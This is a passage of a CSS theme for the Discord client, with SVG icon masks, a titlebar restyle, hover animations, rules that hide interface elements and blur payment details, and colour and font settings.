fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=better-folders]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M1 13.74H3.10736C4.26568 13.74 5.39966 13.7156 5.62354 13.6913C7.0982 13.5111 8.02291 12.8585 8.35873 11.7677C8.495 11.3342 8.50473 10.4674 8.38306 10.0047C8.29546 9.66381 8.11052 9.26934 7.92557 9.02584L7.80877 8.87L7.92557 8.70929C8.5388 7.896 8.65561 6.53727 8.19812 5.57301C7.97911 5.10549 7.55082 4.69641 7.0252 4.44317C6.2027 4.0487 5.76955 4 3.08303 4H1V13.74ZM3.48211 5.9967L3.47238 8.11515L3.48211 11.7316L5.36559 11.719L5.60407 11.5729C6.04209 11.3001 6.19783 10.7888 5.96909 10.3456C5.75981 9.93166 5.4094 9.7953 4.57229 9.7953H3.9688V7.9447H4.59176C5.25852 7.93983 5.46293 7.896 5.74034 7.68659C6.1881 7.34082 6.17836 6.56649 5.72088 6.2402C5.44346 6.04053 5.17579 5.9967 4.30461 5.9967H3.48211Z' fill='white'/%3E%3Cpath d='M14.8293 3.39286V4.71875H16.2146C16.4305 4.71875 16.6049 4.89431 16.6049 5.11161V8.97879L17.9732 10.4189C17.9902 10.4372 17.9998 10.4613 18 10.4864V13.6071C18 13.8244 17.8256 14 17.6098 14H10.3902C10.1744 14 10 13.8244 10 13.6071V5.03795C10 4.87835 10.0963 4.73348 10.2439 4.67333L14.2927 3.02824C14.339 3.00982 14.389 3 14.439 3C14.6549 3 14.8293 3.17556 14.8293 3.39286ZM17.122 13.1161V10.8019L15.7268 9.33359V5.60268H14.8293V11.8638C14.8293 12.0234 14.7329 12.1683 14.5854 12.2285L12.4 13.1161H17.122ZM10.878 5.31663V12.8337L14 11.5655V4.04721L10.878 5.31663Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=show-all-activities]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='19' viewBox='0 0 18 19' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M9.70833 6.58854V2.69271H5.45833V6.58854L7.58333 8.71354L9.70833 6.58854ZM4.39583 7.65104H0.5V11.901H4.39583L6.52083 9.77604L4.39583 7.65104ZM5.45833 12.9635V16.8594H9.70833V12.9635L7.58333 10.8385L5.45833 12.9635Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M9.70833 2.69271V6.58854L7.58333 8.71354L5.45833 6.58854V2.69271H9.70833ZM0.5 7.65104H4.39583L6.52083 9.77604L4.39583 11.901H0.5V7.65104ZM5.45833 16.8594V12.9635L7.58333 10.8385L9.70833 12.9635V16.8594H5.45833Z' fill='white'/%3E%3Cpath d='M11.5082 10C11.5082 11.3807 12.6254 12.5 14.0036 12.5C15.3818 12.5 16.499 11.3807 16.499 10C16.499 8.61929 15.3818 7.5 14.0036 7.5C12.6254 7.5 11.5082 8.61929 11.5082 10Z' fill='white'/%3E%3Cpath d='M16.5 13.5H11.5091V18.5H16.5V13.5Z' fill='white'/%3E%3Cpath d='M16.4986 6.5L14.0032 1.5L11.5077 6.5H16.4986Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=view-raw]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M4 2.7H5.4V4.1H4V7.6C4 7.9713 3.8525 8.3274 3.58995 8.58995C3.3274 8.8525 2.9713 9 2.6 9C2.9713 9 3.3274 9.1475 3.58995 9.41005C3.8525 9.6726 4 10.0287 4 10.4V13.9H5.4V15.3H4C3.251 15.111 2.6 14.67 2.6 13.9V11.1C2.6 10.7287 2.4525 10.3726 2.18995 10.1101C1.9274 9.8475 1.5713 9.7 1.2 9.7H0.5V8.3H1.2C1.5713 8.3 1.9274 8.1525 2.18995 7.88995C2.4525 7.6274 2.6 7.2713 2.6 6.9V4.1C2.6 3.7287 2.7475 3.3726 3.01005 3.11005C3.2726 2.8475 3.6287 2.7 4 2.7ZM13.8 2.7C14.1713 2.7 14.5274 2.8475 14.7899 3.11005C15.0525 3.3726 15.2 3.7287 15.2 4.1V6.9C15.2 7.2713 15.3475 7.6274 15.6101 7.88995C15.8726 8.1525 16.2287 8.3 16.6 8.3H17.3V9.7H16.6C16.2287 9.7 15.8726 9.8475 15.6101 10.1101C15.3475 10.3726 15.2 10.7287 15.2 11.1V13.9C15.2 14.2713 15.0525 14.6274 14.7899 14.89C14.5274 15.1525 14.1713 15.3 13.8 15.3H12.4V13.9H13.8V10.4C13.8 10.0287 13.9475 9.6726 14.2101 9.41005C14.4726 9.1475 14.8287 9 15.2 9C14.8287 9 14.4726 8.8525 14.2101 8.58995C13.9475 8.3274 13.8 7.9713 13.8 7.6V4.1H12.4V2.7H13.8Z' fill='white'/%3E%3Cpath d='M8.89999 7.36667C8.74543 7.36908 8.59201 7.39364 8.44441 7.43958C8.51268 7.55965 8.54903 7.69522 8.54999 7.83333C8.54999 7.94058 8.52887 8.04678 8.48783 8.14586C8.44679 8.24494 8.38663 8.33497 8.3108 8.4108C8.23496 8.48664 8.14493 8.54679 8.04585 8.58784C7.94677 8.62888 7.84057 8.65 7.73333 8.65C7.59521 8.64904 7.45964 8.61269 7.33958 8.54442C7.24485 8.87295 7.25589 9.22296 7.37113 9.54487C7.48638 9.86678 7.69999 10.1443 7.9817 10.338C8.26342 10.5318 8.59896 10.632 8.94079 10.6245C9.28263 10.6169 9.61342 10.502 9.88633 10.2961C10.1592 10.0901 10.3604 9.80346 10.4614 9.47679C10.5623 9.15011 10.558 8.79996 10.4488 8.47591C10.3397 8.15187 10.1314 7.87037 9.85346 7.67129C9.57548 7.47221 9.24191 7.36564 8.89999 7.36667ZM13.0492 8.78708C12.2584 7.24402 10.6927 6.2 8.89999 6.2C7.10726 6.2 5.54116 7.24475 4.75074 8.78723C4.71738 8.85322 4.7 8.92613 4.7 9.00007C4.7 9.07402 4.71738 9.14693 4.75074 9.21292C5.5416 10.756 7.10726 11.8 8.89999 11.8C10.6927 11.8 12.2588 10.7553 13.0492 9.21277C13.0826 9.14678 13.1 9.07387 13.1 8.99993C13.1 8.92598 13.0826 8.85308 13.0492 8.78708ZM8.89999 11.1C7.46135 11.1 6.14243 10.2979 5.43018 9C6.14243 7.70208 7.4612 6.9 8.89999 6.9C10.3388 6.9 11.6576 7.70208 12.3698 9C11.6577 10.2979 10.3388 11.1 8.89999 11.1Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.4 2.7H4C3.6287 2.7 3.2726 2.8475 3.01005 3.11005C2.7475 3.3726 2.6 3.7287 2.6 4.1V6.9C2.6 7.2713 2.4525 7.6274 2.18995 7.88995C1.9274 8.1525 1.5713 8.3 1.2 8.3H0.5V9.7H1.2C1.5713 9.7 1.9274 9.8475 2.18995 10.1101C2.4525 10.3726 2.6 10.7287 2.6 11.1V13.9C2.6 14.67 3.251 15.111 4 15.3H5.4V13.9H4V10.4C4 10.0287 3.8525 9.6726 3.58995 9.41005C3.3274 9.1475 2.9713 9 2.6 9C2.9713 9 3.3274 8.8525 3.58995 8.58995C3.8525 8.3274 4 7.9713 4 7.6V4.1H5.4V2.7ZM14.7899 3.11005C14.5274 2.8475 14.1713 2.7 13.8 2.7H12.4V4.1H13.8V7.6C13.8 7.9713 13.9475 8.3274 14.2101 8.58995C14.4726 8.8525 14.8287 9 15.2 9C14.8287 9 14.4726 9.1475 14.2101 9.41005C13.9475 9.6726 13.8 10.0287 13.8 10.4V13.9H12.4V15.3H13.8C14.1713 15.3 14.5274 15.1525 14.7899 14.89C15.0525 14.6274 15.2 14.2713 15.2 13.9V11.1C15.2 10.7287 15.3475 10.3726 15.6101 10.1101C15.8726 9.8475 16.2287 9.7 16.6 9.7H17.3V8.3H16.6C16.2287 8.3 15.8726 8.1525 15.6101 7.88995C15.3475 7.6274 15.2 7.2713 15.2 6.9V4.1C15.2 3.7287 15.0525 3.3726 14.7899 3.11005ZM8.89999 6.2C10.6927 6.2 12.2584 7.24402 13.0492 8.78708C13.0826 8.85308 13.1 8.92598 13.1 8.99993C13.1 9.07387 13.0826 9.14678 13.0492 9.21277C12.2588 10.7553 10.6927 11.8 8.89999 11.8C7.10726 11.8 5.5416 10.756 4.75074 9.21292C4.71738 9.14693 4.7 9.07402 4.7 9.00007C4.7 8.92613 4.71738 8.85322 4.75074 8.78723C5.54116 7.24475 7.10726 6.2 8.89999 6.2ZM5.43018 9C6.14243 10.2979 7.46135 11.1 8.89999 11.1C10.3388 11.1 11.6577 10.2979 12.3698 9C11.6576 7.70208 10.3388 6.9 8.89999 6.9C7.4612 6.9 6.14243 7.70208 5.43018 9ZM8.89999 7.36667C8.74543 7.36908 8.59201 7.39364 8.44441 7.43958C8.51268 7.55965 8.54903 7.69522 8.54999 7.83333C8.54999 7.94058 8.52887 8.04678 8.48783 8.14586C8.44679 8.24494 8.38663 8.33497 8.3108 8.4108C8.23496 8.48664 8.14493 8.54679 8.04585 8.58784C7.94677 8.62888 7.84057 8.65 7.73333 8.65C7.59521 8.64904 7.45964 8.61269 7.33958 8.54442C7.24485 8.87295 7.25589 9.22296 7.37113 9.54487C7.48638 9.86678 7.69999 10.1443 7.9817 10.338C8.26342 10.5318 8.59896 10.632 8.94079 10.6245C9.28263 10.6169 9.61342 10.502 9.88633 10.2961C10.1592 10.0901 10.3604 9.80346 10.4614 9.47679C10.5623 9.15011 10.558 8.79996 10.4488 8.47591C10.3397 8.15187 10.1314 7.87037 9.85346 7.67129C9.57548 7.47221 9.24191 7.36564 8.89999 7.36667Z' fill='white'/%3E%3C/svg%3E%0A")}.theme-dark{--settings-icon-color: white;--settings-subscriptions: #7289da;--settings-hypesquad: #fbb848;--settings-logout: #f04747;--settings-alt-focused: white;--settings-guild-premium: #7289da;--settings-guild-delete: #f04747}.theme-light{--settings-icon-color: #4f5660;--settings-subscriptions: #7289da;--settings-hypesquad: #fbb848;--settings-logout: #f04747;--settings-alt-focused: white;--settings-guild-premium: #7289da;--settings-guild-delete: #f04747}.side-8zPYf6>.item-PXvHYJ:not(.role-3wi9Tf),.sidebar-CFHs9e .ui-tab-bar-item{display:flex;align-items:center}.side-8zPYf6>.item-PXvHYJ:not(.role-3wi9Tf)::before,.sidebar-CFHs9e .ui-tab-bar-item::before{content:"";width:22px;height:22px;left:15px;margin-right:6px;margin-top:-2px;background:var(--settings-icon-color);-webkit-mask:var(--icon) center/contain no-repeat;mask:var(--icon) center/contain no-repeat;--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 447 447'%3E%3Cpath fill='white' d='M221 117.1l-33.8-33.8 70-70c9.3-9.3 24.5-9.3 33.8 0 9.3 9.3 9.3 24.5 0 33.8l-70 70z'/%3E%3Cpath fill='white' d='M216.3 121.7l-33.8-33.8c-2.6-2.6-2.6-6.8 0-9.3l70-70c11.9-11.9 31.2-11.9 43.1 0s11.9 31.2 0 43.1l-70 70c-2.6 2.6-6.7 2.6-9.3 0zm-19.8-38.4l24.5 24.5 65.3-65.3c6.7-6.7 6.7-17.7 0-24.5-6.7-6.7-17.7-6.7-24.5 0l-65.3 65.3z'/%3E%3Cpath fill='white' d='M312.7 208.8L278.9 175l70-70c9.3-9.3 24.5-9.3 33.8 0 9.3 9.3 9.3 24.5 0 33.8l-70 70z'/%3E%3Cpath fill='white' d='M308 213.4l-33.8-33.8c-2.6-2.6-2.6-6.8 0-9.3l70-70c11.9-11.9 31.2-11.9 43.1 0s11.9 31.2 0 43.1l-70 70c-2.5 2.6-6.7 2.6-9.3 0zM288.2 175l24.5 24.5 65.3-65.3c6.7-6.7 6.7-17.7 0-24.5s-17.7-6.7-24.5 0L288.2 175z'/%3E%3Cpath fill='white' d='M143.71 88.065l24.112-24.113L331.94 228.07l-24.112 24.112z'/%3E%3Cpath fill='white' d='M303 257L138.9 92.9c-2.7-2.7-2.7-7 0-9.7L163 59.1c2.7-2.7 7-2.7 9.7 0l164.1 164.1c2.7 2.7 2.7 7 0 9.7L312.7 257c-2.7 2.7-7 2.7-9.7 0zM153.4 88.1l154.5 154.5 14.5-14.5L167.9 73.6l-14.5 14.5z'/%3E%3Cpath fill='white' d='M161.2 327.6l-92.9-92.9c-14.3-14.3-14.3-37.6 0-51.9l85.1-85.1 144.8 144.8-85.1 85.1c-14.3 14.4-37.6 14.4-51.9 0z'/%3E%3Cpath fill='white' d='M156.4 332.4l-92.9-92.9c-17-17-17-44.6 0-61.6l85.1-85.1c2.7-2.7 7-2.7 9.7 0L303 237.7c2.7 2.7 2.7 7 0 9.7l-85 85c-17 17-44.7 17-61.6 0zm-3-225l-80.2 80.2c-11.7 11.7-11.7 30.6 0 42.3l92.9 92.9c11.7 11.7 30.6 11.7 42.3 0l80.2-80.2-135.2-135.2z'/%3E%3Cpath fill='white' d='M71.328 295.671l28.991-28.991 28.991 28.991-28.991 28.991z'/%3E%3Cpath fill='white' d='M95.4 329.5l-29-29c-2.7-2.7-2.7-7 0-9.7l29-29c2.7-2.7 7-2.7 9.7 0l29 29c2.7 2.7 2.7 7 0 9.7l-29 29c-2.7 2.6-7 2.6-9.7 0zM81 295.7l19.3 19.3 19.3-19.3-19.3-19.3L81 295.7z'/%3E%3Cpath fill='white' d='M143.7 445.3L81 382.6c-21.3-21.3-21.3-55.9 0-77.2 2.7-2.7 7-2.7 9.7 0 2.7 2.7 2.7 7 0 9.7-16 16-16 42 0 57.9l62.8 62.8c2.7 2.7 2.7 7 0 9.7s-7.1 2.5-9.8-.2z'/%3E%3C/svg%3E");flex-shrink:0}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fonts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Fonts | Adding Oxygen Font*/
@import url('https://fonts.googleapis.com/css2?family=Oxygen&display=swap');

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Database |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Currently in development */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Old Status Indicator ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.header-QKLPzZ rect[mask="url(#svg-mask-status-online)"], .userPopout-3XzG_A rect[mask="url(#svg-mask-status-online)"] {
    fill: #43b581; }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-idle)"] {
    fill: #faa61a;
    mask: url(#svg-mask-status-online); }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-dnd)"] {
    fill: #f04747;
    mask: url(#svg-mask-status-online); }
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-streaming)"]{
    mask: url(#svg-mask-status-online);}
.wrapper-3t9DeA rect[mask="url(#svg-mask-status-offline)"] {
    mask: url(#svg-mask-status-online);}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Yellow Permissons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.passthroughSelected-1Eq0Kl {
    background: #ffba00 !important;}
  .passthrough-1c2ewQ:not(.passthroughSelected-1Eq0Kl) img {
    content: url("https://raw.githubusercontent.com/CorellanStoma/Powercord/assets/Icons/yellow.svg");}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Windows Titlebar |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
#app-mount {
    border: none;
    box-sizing:border-box;}
.typeWindows-1za-n7 {
    height:calc(var(--titlebar-height) - var(--titlebar-drag-margin));
    margin-top:var(--titlebar-drag-margin);
    position:relative;
    border-bottom:1px solid var(--titlebar-background-color);}
.platform-win .layer-3QrUeG {
    top:calc(var(--titlebar-height) * -1);
    padding-top:var(--titlebar-height);}
.winButton-iRh8-Z,
.winButton-iRh8-Z:hover,
.winButton-iRh8-Z:active {
    height:var(--titlebar-height);
    width:var(--titlebar-button-width);
    top:calc(var(--titlebar-drag-margin) * -1);
    color:var(--titlebar-text-color);
    transition:125ms ease;
    cursor:default;}
.winButton-iRh8-Z svg {
    width:11px;
    height:11px;}
.winButtonMinMax-PBQ2gm:hover {
    background:var(--titlebar-button-hover);
}
.winButtonMinMax-PBQ2gm:nth-child(3):after {
      content:'';
      width:11px;
      height:11px;
      -webkit-mask:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" version="1.1" width="10" height="10"><path d="M 0,0 0,10 10,10 10,0 Z M 1,1 9,1 9,9 1,9 Z"/></svg>') center/11px no-repeat;
      background:var(--titlebar-text-color);}
.winButtonMinMax-PBQ2gm:nth-child(3) svg {
    display:none;}
.winButtonMinMax-PBQ2gm:active {
    background:var(--titlebar-button-active);}
.winButtonClose-1HsbF-:hover,
.winButtonClose-1HsbF-:active {
    color:#fff;}
.winButtonClose-1HsbF-:hover {
    background:var(--titlebar-close-button-hover);}
.winButtonClose-1HsbF-:active {
    background:var(--titlebar-close-button-active);}
.wordmarkWindows-1v0lYD {
	width: 100vw;
	background: var(--titlebar-background-color);
	padding: 0;
	display: flex;
	align-items: center;
    top:calc(var(--titlebar-drag-margin) * -1);
	height:calc(var(--titlebar-height) + 1px);
	pointer-events:none;
	box-sizing:border-box;
	border-bottom:0;}
.wordmarkWindows-1v0lYD svg {
    display:none;}
.wordmarkWindows-1v0lYD::before {
    content:'';
    width:1em;
    height:1em;
    font-size:var(--titlebar-icon-font-size);
    padding:0 1em;
    background: url('https://raw.githubusercontent.com/CorellanStoma/Powercord/assets/Icons/discord.svg') center/contain no-repeat;}
.wordmarkWindows-1v0lYD::after {
    content: "\a CreArts " var(--version);
    color:var(--titlebar-text-color);
    font-size:var(--titlebar-font-size);
    font-weight:400;
    font-family:'Segoe UI';}
.withFrame-haYltI {
    height: var(--titlebar-height);
    margin-top: var(--titlebar-drag-margin);}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Mobile Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.button-1w5pas {
  background: url('https://raw.githack.com/CorellanStoma/Powercord/assets/Icons/menu.svg');
  width: 18px;
  height: 18px;
  position: relative;
  opacity: 1;
  top: -1px;}
.button-1w5pas path {
  display: none;}
.button-1w5pas.open-1Te94t {
  transform: none;}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Autocomplete Scrollable */ /*|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.autocomplete-1vrmpx {
    max-height: calc(100vh - 200px);
    overflow-y: scroll;}
.autocomplete-1vrmpx::-webkit-scrollbar-thumb {
    background-clip: padding-box;
    border: 2px solid transparent;
    border-radius: 4px;
    background-color: var(--scrollbar-thin-thumb);
    min-height: 40px;}
.autocomplete-1vrmpx::-webkit-scrollbar {
    width: 0px;
    height: 0px;}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Mention Color*/ /*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.mentioned-xhSam7:before {
    background: rgba(var(--Mention), 1);}
.mentioned-xhSam7 {
    background: rgba(var(--Mention), 0.1);
    border-radius: 0 24px 24px 0px;
    margin-right: 20px}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*| Add-Ons | Blur Details*/ /*|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
#app-mount .standardSidebarView-3F1I7i .payment-info .description-3_Ncsb,
#app-mount .standardSidebarView-3F1I7i .paymentSourceRow-3FbcL_ .subText-V8PTt8,
#app-mount .standardSidebarView-3F1I7i .userSettingsAccount-2eMFVR div:nth-child(2) > div:nth-child(2) > .viewBody-2Qz-jg {
    transition: all 150ms cubic-bezier(0.550, 0.085, 0.680, 0.530);
    filter: blur(4px);
    opacity: 0.8;}
#app-mount .standardSidebarView-3F1I7i .payment-info .description-3_Ncsb:hover,
#app-mount .standardSidebarView-3F1I7i .paymentSourceRow-3FbcL_ .subText-V8PTt8:hover,
#app-mount .standardSidebarView-3F1I7i .userSettingsAccount-2eMFVR div:nth-child(2) > div:nth-child(2) > .viewBody-2Qz-jg:hover {
    transition: all 150ms cubic-bezier(0.55, 0.09, 0.68, 0.53);
    filter: none;
    opacity: 1;}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Animated |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Animated | Ping */
.numberBadge-2s8kKX { background: var(--Color001) !important; Color: var(--Color006); animation: AnimatedPing 1.2s infinite ease-in-out;}
@keyframes AnimatedPing{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}

/* Animated | Home Button */
.homeIcon-tEMBK1{animation:Home 1.5s infinite ease-in-out}
@keyframes Home{0%{transform:rotate(-4deg)}50%{transform:rotate(4deg) scale(1.01)}100%{transform:rotate(-4deg)}}

/* Animated | Avatar Hover */
.avatar-1BDn8e.clickable-1bVtEA{display:inline-block;cursor:pointer;transition:all .2s ease-in-out}
.avatar-1BDn8e.clickable-1bVtEA:hover{display:inline-block;cursor:pointer;transform:scale(1.2)}
,.avatar-SmRMf2{z-index:20;transition:all .2s ease-in-out}
.avatar-SmRMf2:hover{transform:scale(1.1)}

/* Animated | Icons Hover */
.addButton-1BORrom,.button-14-BFJ,.closeButton-1tv5uR,.closeButton-2GCmT5,.grow-q77ONN,.icon-22AiRD,.iconItem-1-bXkn{transition:all .2s ease-in-out}
.addButton-1BORro:hover,.button-14-BFJ:hover,.closeButton-1tv5uR:hover,.closeButton-2GCmT5:hover,.icon-22AiRD:hover,.iconItem-1-bXkn:hover{transform:scale(1.2)}

/* Animated | Chat Highlight */
.cozy-3raOZG.wrapper-2a6GCs{transition:all .2s ease-in-out}
.cozy-3raOZG.wrapper-2a6GCs:hover{margin-left:12px;transition-delay:.1s}

/* Animated | Channel Highlight */
.mainContent-ENyL1r{transition:all .2s ease-in-out}
.mainContent-ENyL1r:hover{margin-left:6px}

/* Animated | Profile Badge */
.header-QKLPzZ .headerInfo-30uryT .flex-1xMQg5 div{transition:.2s}
.header-QKLPzZ .headerInfo-30uryT .flex-1xMQg5 div:hover{transition:.2s;transform:translateY(-.75px)}

/* Animated | Card Hover */
.auditLog-3jNbM6,.card-3Qj_Yx,.card-FDVird,.connectedAccount-36nQx7,.elevationLow-2lY09M,.item-3eFBNF,.welcomeChannel-1rFrIO{transition:all .2s ease-in-out}
.auditLog-3jNbM6:hover,.card-3Qj_Yx:hover,.card-FDVird:hover,.connectedAccount-36nQx7:hover,.elevationLow-2lY09M:hover,.item-3eFBNF:hover,.welcomeChannel-1rFrIO:hover{transform:scale(1.04)}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Removed ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Removed | Removed the Edited label. */
.edited-3sfAzf {display: none;}

/* Removed | Removed the Nitro home button, the nitro menu can still be accessed via the settings. */
#private-channels [href="/store"] {display: none;}

/* Removed | Removed the chat header at the beginning of the chat. */
.hasDivider-20M1le {display: none;}
.container-3zqIcM {display: none;}

/* Removed | Removed the Nitro & Gif Button in the Chatbox. Gifs can still be selected using the Emoji button. */
.buttonWrapper-1ZmCpA {display: none;}

/* Removed | Removed the closed folder background. */
.closedFolderIconWrapper-15K9MK { background: var(--Color004);}

/* Removed | Removed the Note on the User Profile. */
.note-QfFU8y, .userInfoSectionHeader-CBvMDh  { display: none;}
.userInfoSection-2acyCx {padding: 0px 0;}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugins ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Plugins | Changed the design from "Better Formatting Redux" */
.bf-toolbar::before { background: var(--Color005); border-radius: 90px;}

.bf-toolbar .format { padding: 7px 7px; border-radius: 90px; }

/* Plugins | Total Member Count" */
.total-members-count-box{position:sticky;padding:0;font-size:15px;font-weight:500}

.total-members-count{justify-content:left;background:var(--Color004);padding:12px 140px 12px 60px}

/* Plugins | Audioviz" */
.vp-audioviz-bar{background:var(--audioviz)}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme Settings |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark,
:root {

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Version ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

--version: "v1.2.4 (Beta) (FoxCode Team)"; /*Theme Version*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| CUSTOMIZATION ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Font */

    --font: 'Oxygen';

/* Accent */
    --Color001: #04D869;
    --Color010: #43B581;

/* Background */
    --Color002: #33393D;
    --Color003: #262A2D;
    --Color004: #202427;
    --Color005: #1A1D20;

/* Text */
    --Color006: #FFFFFF;
    --Color007: #DCDDDE;
    --Color008: #b9bbbe;
    --Color009: #4F5459;

/* Mention */

    --Mention: 4,216,105;

/* Shadow */

    --shadow001: 0px 8px 12px 4px #00000040;

/* Radius */

    --Radius001: 24px; /* The value should not exceed 24px. */
    --Radius002: 90px; /* The value should not exceed 90px. */

/* Picture-in-oicture Opacity */

    --picture-in-picture: 60%;

/* Avatar Size */

    --avatar-size: 60px;

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Blurple Recolor ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
